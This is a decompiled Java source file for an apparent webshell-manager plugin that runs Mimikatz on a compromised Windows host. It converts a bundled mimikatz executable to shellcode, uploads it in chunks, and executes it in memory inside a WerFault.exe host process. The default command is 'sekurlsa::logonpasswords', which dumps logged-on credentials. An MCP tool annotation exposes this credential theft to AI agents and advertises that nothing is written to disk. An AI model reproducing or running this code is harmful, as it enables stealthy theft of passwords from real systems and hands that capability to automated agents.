//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.generic;

import core.EasyI18N;
import core.Encoding;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.UiFunction;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;
import core.annotation.McpTool;
import core.annotation.McpParam;
import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.util.Map;

public abstract class Mimikatz implements Plugin {
    private final JPanel panel = new JPanel(new BorderLayout());
    private final JLabel argsLabel = new JLabel("args");
    private final JTextField argsTextField = new JTextField(" \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\" ");
    private final JButton runButton = new JButton("Run");
    private final JSplitPane splitPane = new JSplitPane();
    private final RTextArea resultTextArea = new RTextArea();
    private boolean loadState;
    protected ShellEntity shellEntity;
    protected Payload payload;
    private Encoding encoding;
    private ShellcodeLoader loader;

    public Mimikatz() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.argsLabel);
        topPanel.add(this.argsTextField);
        topPanel.add(this.runButton);
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.resultTextArea));
        this.splitPane.addComponentListener(new ComponentAdapter() {
            public void componentResized(ComponentEvent e) {
                Mimikatz.this.splitPane.setDividerLocation(0.15);
            }
        });
        this.panel.add(this.splitPane);
        EasyI18N.installObject(this);
    }

    protected abstract ShellcodeLoader getShellcodeLoader();

    private void runButtonClick(ActionEvent actionEvent) {
        if (this.loader == null) {
            this.loader = this.getShellcodeLoader();
        }

        if (this.loader == null) {
            GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), "未找到loader");
        } else {
            byte[] pe = functions.readInputStreamAutoClose(Mimikatz.class.getResourceAsStream("assets/mimikatz-" + (this.payload.isX64() ? "64" : "32") + ".exe"));

            try {
                byte[] result = TH_TOOLS.runPePreferThTools(this.shellEntity, this.loader, this.argsTextField.getText().trim(), pe, 6000, this.resultTextArea.getPrintStream());
                this.resultTextArea.setText(this.encoding.Decoding(result));
            } catch (Exception var4) {
                GOptionPane.showMessageDialog(UiFunction.getParentFrame(this.panel), var4.getMessage());
            }

        }
    }

    protected ShellcodeLoader createLoader() {
        return null;
    }

    @McpTool(name = "run", desc = "运行 Mimikatz 凭据提取 (默认: privilege::debug sekurlsa::logonpasswords exit; 纯内存加载执行, 不落盘)", params = {
            @McpParam(name = "shellId", required = true, desc = "Shell ID"),
            @McpParam(name = "command", defaultValue = "privilege::debug sekurlsa::logonpasswords exit", desc = "mimikatz 命令参数") })
    public String mcpRun(Map<String, Object> args) {
        String cmd = String.valueOf(args.getOrDefault("command", "privilege::debug sekurlsa::logonpasswords exit"));
        try {
            byte[] pe = functions.readInputStreamAutoClose(Mimikatz.class.getResourceAsStream("assets/mimikatz-" + (this.payload.isX64() ? "64" : "32") + ".exe"));
            // 1. 确保 ShellcodeLoader + JNA 已加载 (TH_TOOLS 共享内存加载链)
            if (!shells.plugins.java.TH_TOOLS.mcpLoadJarShared(this.shellEntity, this.payload)) {
                return "ShellcodeLoader/JNA 加载失败";
            }
            // 2. 原生 PE -> shellcode (客户端转换)
            byte[] shellcode = PeLoader.peToShellcode(pe, new PrintStream(new ByteArrayOutputStream()));
            if (shellcode == null || shellcode.length == 0) {
                return "PE 转 shellcode 失败";
            }
            // 3. 目标端 ShellcodeLoader.run 内存执行 (宿主进程 + mimikatz 参数, 仿 runPe2 拼接)
            ReqParameter rp = new ReqParameter();
            rp.add("excuteFile", "C:\\Windows\\System32\\WerFault.exe " + cmd);
            rp.add("type", "start");
            if (shellcode.length > this.shellEntity.getOnceBigFileUploadByteNum()) {
                String memFile = "mem://" + java.util.UUID.randomUUID().toString();
                int once = this.shellEntity.getOnceBigFileUploadByteNum();
                for (int off = 0; off < shellcode.length; off += once) {
                    byte[] chunk = java.util.Arrays.copyOfRange(shellcode, off, Math.min(off + once, shellcode.length));
                    String flag = this.payload.bigFileUpload(memFile, (long)off, chunk);
                    if (!"ok".equals(flag)) return "shellcode 分片上传失败: " + flag;
                }
                rp.add("memfile", memFile);
            } else {
                rp.add("shellcode", shellcode);
            }
            rp.add("readWaitTime", "60000");
            byte[] result = this.payload.evalFunc("plugin.ShellcodeLoader", "run", rp);
            return core.Encoding.getEncoding(this.shellEntity).Decoding(result);
        } catch (Exception e) {
            java.io.StringWriter sw = new java.io.StringWriter();
            e.printStackTrace(new java.io.PrintWriter(sw));
            return "执行失败:\n" + sw.toString();
        }
    }

    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(Mimikatz.class, this, Mimikatz.class, this);
    }

    public JPanel getView() {
        return this.panel;
    }
}
